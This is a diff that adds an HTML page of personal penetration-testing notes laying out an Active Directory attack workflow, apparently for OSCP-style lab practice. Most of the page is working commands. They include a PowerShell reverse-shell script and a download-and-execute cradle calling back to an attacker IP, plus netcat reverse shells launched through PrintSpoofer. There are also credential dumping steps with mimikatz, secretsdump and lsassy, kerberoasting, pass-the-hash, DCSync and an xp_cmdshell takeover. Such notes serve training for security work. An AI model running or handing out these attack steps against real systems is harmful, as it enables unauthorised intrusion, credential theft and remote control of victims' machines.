@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Attacking - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <!-- 1. FUNDAMENTALS / FLOW -->
+        <a href="general.html">General</a>
+        <a href="tips.html">Tips</a>
+        <a href="checklist.html">Checklist</a>
+
+        <a href="recon.html">Recon</a>
+        <a href="enumeration.html">Enumeration</a>
+
+        <a href="files.html">Files Searching</a>
+        <a href="file-transfer.html">File Transfer</a>
+
+        <!-- 2. WEB (USUAL ENTRY POINT) -->
+        <div class="dropdown">
+            <a href="#">Web ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Fingerprinting ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="web/directoryBruteForce.html">Directory Brute Force</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Attacks ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="web/directoryTraversal.html">Directory Traversal</a>
+                        <a href="web/fileInclusions.html">File Inclusions</a>
+                        <a href="web/fileUpload.html">File Uploads</a>
+                        <a href="web/osCommand.html">OS Command Injections</a>
+                        <a href="web/sqli.html">SQL Injections</a>
+                    </div>
+                    <a href="web/wp.html">Wordpress</a>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- 3. PASSWORD ATTACKS (POST-ENUM) -->
+        <div class="dropdown">
+            <a href="#">Passwords Attacks ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Network Login ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="sshBF.html">SSH</a>
+                        <a href="rdpBF.html">RDP</a>
+                        <a href="httpPostBF.html">HTTP POST Login</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Password Cracking ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="CrakingIntro.html">Cracking Intro</a>
+                        <a href="MutatingWordlist.html">Mutating Wordlist</a>
+                        <a href="CrakingMethodology.html">Cracking Methodology</a>
+                        <a href="PasswordManager.html">Password Manager</a>
+                        <a href="sshPKP.html">SSH Private Key Passphrase</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Hash Attacks ▾</a>
+                    <div class="dropdown-subcontent">
+                        <a href="ntlmCrack.html">Cracking NTLM</a>
+                        <a href="ntlmPass.html">Passing NTLM</a>
+                        <a href="ntlm2Crack.html">Cracking Net-NTLMv2</a>
+                        <a href="ntlm2Relay.html">Relaying Net-NTLMv2</a>
+                        <a href="WindowsCredsGuard.html">Windows Credential Guard</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- 4. ACTIVE DIRECTORY (AFTER INITIAL FOOTHOLD) -->
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+                <a href="ADprivesc.html">ADprivesc</a>
+            </div>
+        </div>
+
+        <!-- 5. PRIVESC (POST EXPLOITATION) -->
+        <div class="dropdown">
+            <a href="#">Privesc ▾</a>
+            <div class="dropdown-content">
+                <a href="linux-privesc.html">Linux Privesc</a>
+                <a href="windows_privesc.html">Windows PrivEsc</a>
+            </div>
+        </div>
+
+        <!-- 6. TOOLS / UTILS (REFERENCE SECTION) -->
+        <a href="toolsCheatsheet.html">Tools Cheatsheet</a>
+        <a href="pivoting.html">Pivoting</a>
+        <a href="qol.html">QOL</a>
+
+    </nav>
+
+    <div class="search-bar">
+        <input type="text" id="global-search" placeholder="Search..." />
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
+    </div>
+
+    <div class="container">
+        <h1>AD SET Workflow</h1>
+
+        <div class="section">
+            <div class="section-header">1. Scan</div>
+            <div class="section-content">
+                <p>First Always run a nmap scan</p>
+
+                <pre><code>sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts</code></pre>
+
+                <pre><code>nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services</code></pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">2. Access to the server</div>
+            <div class="section-content">
+                <p>Once we find valir user and password/hash we connect via winrm</p>
+
+                <pre><code>
+evil-winrm -i IP -u user -p 'Password123!'
+            </code></pre>
+
+                <p>Then we always enumerate</p>
+
+                <pre><code>
+whoami
+echo %USERNAME%
+whoami /priv
+whoami /groups
+whoami /all
+net user
+net user username
+net localgroup
+net localgroup Administrators
+net user /domain
+net group /domain
+            </code></pre>
+
+                <p>Now we check for more networks</p>
+
+                <pre><code>ipconfig</code></pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">3. Privesc</div>
+            <div class="section-content">
+                <p>After we find any interesting privilege, we try to escalate our privileges</p>
+                <h2 style="color: aqua;">Option 1 using nc</h2>
+
+                <p>After we find any interesting privilege, we try to escalate our privileges</p>
+                <p>We will use SeImpersonate as an example</p>
+                <p>We upload and execute PrintSpoofer64.exe in order to see if we are nt authority\system</p>
+
+                <pre><code>
+upload PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c "cmd /c whoami"
+            </code></pre>
+
+                <p>Now we upload nc.exe and launch revershell. Out netcat listener whould be waiting already</p>
+
+                <pre><code>
+rlwrap nc -nlvp 9999
+            </code></pre>
+
+                <pre><code>
+upload nc.exe
+.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 10.10.10.10 9999 -e cmd.exe"
+            </code></pre>
+
+                <h2 style="color: aqua;">Option 2 using shell.ps1</h2>
+                <p>We create the following script shell.ps1 in our kali</p>
+                <pre><code>
+                $client = New-Object System.Net.Sockets.TCPClient("192.168.45.192",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()
+}
+            </code></pre>
+                <p>And Upload Printspoofer.exe</p>
+
+                <pre><code>
+upload PrintSpoofer64.exe
+            </code></pre>
+                <p>Then we start our nc listener and http python server</p>
+                <pre><code>
+nc -nlvp 4444
+python3 -m http.server
+            </code></pre>
+                <p>And execute it fron evil-winRM session</p>
+                <pre><code>
+.\PrintSpoofer64.exe -i -c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.192:8000/shell.ps1')"
+            </code></pre>
+                <p>At this point we should have an nt authority\system revershell</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">4. What to do after admin revershell</div>
+            <div class="section-content">
+
+                <p>First, we always add our known user to the administrator grorup</p>
+
+                <pre><code>
+net localgroup Administrators eric.wallows /add
+            </code></pre>
+                <p>Then we can restart our evil-winrm session that we started on step 1</p>
+
+                <h2 style="color: aquamarine;">Get hashes</h2>
+
+                <p>Once we are admin, we can try to dump NTLM passwords and try to crack it</p>
+                <pre><code>
+nxc smb 192.168.219.141 -u Eric.Wallows -p EricLikesRunning800 -M lsassy
+hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt --quiet
+            </code></pre>
+                <p>We can also try to get SAM hashes</p>
+                <pre><code>
+reg save HKLM\SAM sam  
+reg save HKLM\SYSTEM system  
+reg save HKLM\SECURITY security  
+            </code></pre>
+                <p><strong>Important: </strong> at this point we should start storing every hash that we are getting
+                    into a file in order to try pass the hash</p>
+
+                <p>We can also try to crack it</p>
+
+                <pre><code>
+                        mpacket-secretsdump corp.com/user:Password123!@IP
+
+# using ntds and system files
+#We can find ntds file on C:\Windows\NTDS\ntds.dit
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+#NTLM hashes
+nxc smb 192.168.219.141 -u user -p password -M lsassy
+
+<hr>
+
+echo "3c4495bbd678fac8c9d218be4f2bbc7b" > hash.txt
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 hash.txt --show
+
+#hashcat from file
+hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 hashes --show
+            </code></pre>
+
+                <h2 style="color: aquamarine;">Get shell history</h2>
+                <pre><code>
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+            </code></pre>
+
+            <h2 style="color: aquamarine;">Plain Text Credentials</h2>
+                <pre><code>
+cmdkey /list
+
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials"
+
+# RunAs saved creds check (sometimes works in labs)
+runas /savecred /user:domain\user cmd.exe
+            </code></pre>
+
+            <h2 style="color: aquamarine;">Sensitive files</h2>
+                <pre><code>
+dir C:\ /s /b | findstr /i "password cred user config unattended"
+
+# web config files (VERY IMPORTANT in AD boxes)
+dir C:\inetpub\wwwroot\web.config /s
+dir C:\ /s /b | findstr web.config
+
+# unattended install files (classic OSCP gold)
+dir C:\ /s /b | findstr unattend
+type C:\Windows\Panther\Unattend.xml
+type C:\Windows\Panther\Unattend\Unattend.xml
+            </code></pre>
+
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">5. Pivoting</div>
+            <div class="section-content">
+
+                <p>It is very important to start pivoting when we extracted everything that we could like passwords,
+                    hashses, users..</p>
+                <p>First we will start ligolo</p>
+                <pre><code>
+sudo ./proxy -selfcert
+            </code></pre>
+                <p>We also need to upload the agent.exe file to the server</p>
+                <p>We can do it via http python server or upload from evil-winrm</p>
+                <p>Then we start agent.exe</p>
+                <pre><code>
+certutil -urlcache -split -f http://192.168.45.192:8000/agent.exe C:\Windows\Temp\agent.exe
+C:\Windows\Temp\agent.exe -connect 192.168.45.192:11601 -ignore-cert
+            </code></pre>
+                <p>After this, we set the session on ligolo and we start the tunneling</p>
+                <pre><code>
+session 1
+autoroute
+            </code></pre>
+                <p>When everything is done, we sould be able to ping the newnetwork</p>
+                <pre><code>
+ping 10.10.179.140
+            </code></pre>
+            </div>
+
+        </div>
+
+        <div class="section">
+            <div class="section-header">6. After pivoting</div>
+            <div class="section-content">
+                <p>Our goal here is to get a shell on pivoted system</p>
+                <p>Always run nmap normally</p>
+                <pre><code>sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts</code></pre>
+
+                <pre><code>nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services</code></pre>
+                <p>After everyhing is scanned, we can try to start pass the hash attacks using hashes that we found</p>
+                <h2 style="color: aquamarine;">General things to do</h2>
+                <p>Kerberoasting using previous known user</p>
+                <pre><code>impacket-GetUserSPNs -request -dc-ip 10.10.85.148 oscp.exam/eric.wallows
+                </code></pre>
+                <p>Mimikatz</p>
+                <pre><code>./mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+                </code></pre>
+                <p>AS-REP roasting </p>
+                <pre><code>impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+                </code></pre>
+                <p>Pass The Hash</p>
+                <pre><code>nxc winrm 10.10.179.142 -u 2users -H passthehash --continue-on-success
+                </code></pre>
+                <p>Dump Credentials</p>
+                <pre><code>impacket-secretsdump corp.com/user:Password123!@<IP>
+                
+# using ntds and system files
+#We can find ntds file on C:\Windows\NTDS\ntds.dit
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+#NTLM hashes
+nxc smb 192.168.219.141 -u user -p password -M lsassy
+                </code></pre>
+                <p>DC Sync</p>
+                <pre><code>impacket-secretsdump -just-dc-user administrator corp.com/user:Password123!@DC-IP
+                </code></pre>
+                <h2 style="color: aquamarine;">Example 1: WinRM</h2>
+                <p>Here we run nxc in order to see if any user and hash frond previoulsy is valid for us to run
+                    evil-winrm on target system</p>
+                <pre><code>nxc winrm 10.10.179.142 -u 2users -H passthehash --continue-on-success
+                    [+] OSCP\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
+
+evil-winrm -i 10.10.179.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+*Evil-WinRM* PS C:\windows.old\windows\System32>
+                </code></pre>
+                <h2 style="color: aquamarine;">MSSQL</h2>
+                <p>Here We find mssql open port</p>
+                <p>First we run kerberoasting</p>
+                <pre><code>impacket-GetUserSPNs -request -dc-ip 10.10.85.146 oscp.exam/eric.wallows
+                </code></pre>
+                <p>We get the hashes and crack them</p>
+                <pre><code>hashcat -m 13100 hashes.txt rockyou.txt
+                </code></pre>
+                <p>Now we connect to the mssql</p>
+                <pre><code>impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.85.148 -windows-auth
+                </code></pre>
+                <p>Once inside the db, we allow system commands</p>
+                <pre><code> EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+                </code></pre>
+                <p>Now we can start running commands</p>
+                <pre><code> 
+                    EXEC xp_cmdshell 'whoami /priv'  
+                </code></pre>
+                <p>Now we share print spoofer with http python server</p>
+                <pre><code> 
+                    python3 -m http.server 9998 --bind 127.0.0.1 
+                </code></pre>
+                <p>To do that, we alse need to tunneling from ligolo</p>
+                <pre><code> 
+                    listener_add --addr 0.0.0.0:9998 --to 127.0.0.1:9998  
+                </code></pre>
+                <p>Then we get it on mssql</p>
+                <pre><code> 
+                    EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.85.147:9998/PrintSpoofer64.exe -o C:\Users\Public\PrintSpoofer64.exe';
+                </code></pre>
+                <p>We also check if it worked</p>
+                <pre><code> 
+                    EXEC xp_cmdshell 'powershell -c "dir C:\Users\Public';
+                </code></pre>
+                <p>We have to do the same with nc.exe</p>
+                <p>We start the rever</p>
+                <pre><code> 
+                    rlwrap nc -nlvp 9999
+                </code></pre>
+
+
+                <p>After that, we execute it</p>
+                <pre><code> 
+                    exec xp_cmdshell 'C:\Users\Public\PrintSpoofer64.exe -c "nc.exe 10.10.85.147 9998 -e powershell"';
+                </code></pre>
+                <p>After that, we should have a admin revershell from second server</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll(".section-header, .sub-section-header").forEach(h => {
+            h.addEventListener("click", () => {
+                h.parentElement.classList.toggle("active")
+            })
+        });
+        function toggleSearchResults() {
+            const results = document.getElementById("search-results");
+            const toggleBtn = document.getElementById("toggle-results");
+
+            results.classList.toggle("collapsed");
+
+            if (results.classList.contains("collapsed")) {
+                toggleBtn.textContent = "▼";
+            } else {
+                toggleBtn.textContent = "▲";
+            }
+        }
+
+        function performSearch() {
+            const query = document.getElementById("global-search").value.toLowerCase();
+            const resultsContainer = document.getElementById("search-results");
+            resultsContainer.innerHTML = "";
+
+            if (!query) {
+                resultsContainer.classList.add("collapsed");
+                return;
+            }
+
+            const allElements = Array.from(document.body.querySelectorAll("*"))
+                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+            if (allElements.length === 0) {
+                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+            } else {
+                allElements.forEach((el, idx) => {
+                    let container = el.closest(".section, .sub-section") || el;
+
+                    if (!container.id) {
+                        container.id = `search-target-${idx}`;
+                    }
+
+                    const div = document.createElement("div");
+                    div.textContent = el.textContent;
+                    div.style.cursor = "pointer";
+                    div.style.padding = "5px 10px";
+                    div.style.borderBottom = "1px solid #1e293b";
+                    div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                    div.onmouseout = () => div.style.backgroundColor = "";
+                    div.onclick = () => {
+                        if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                            container.classList.add("active");
+                        }
+
+                        container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                        container.classList.add("highlight-fade");
+                        setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                    };
+
+                    resultsContainer.appendChild(div);
+                });
+            }
+
+            resultsContainer.classList.remove("collapsed");
+        }
+        document.querySelectorAll(".sub-title").forEach(title => {
+            const wrapper = document.createElement("div");
+            wrapper.classList.add("sub-wrapper");
+
+            const content = document.createElement("div");
+            content.classList.add("sub-content");
+
+            // meter wrapper en el DOM justo antes del título
+            title.parentNode.insertBefore(wrapper, title);
+
+            // mover el título dentro del wrapper
+            wrapper.appendChild(title);
+
+            // mover todo hasta el siguiente sub-title o section-header
+            let next = wrapper.nextSibling;
+
+            while (
+                next &&
+                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+            ) {
+                const temp = next.nextSibling;
+                content.appendChild(next);
+                next = temp;
+            }
+
+            wrapper.appendChild(content);
+
+            // toggle
+            title.addEventListener("click", () => {
+                wrapper.classList.toggle("active");
+            });
+        });
+    </script>
+
+</body>
+
+</html>
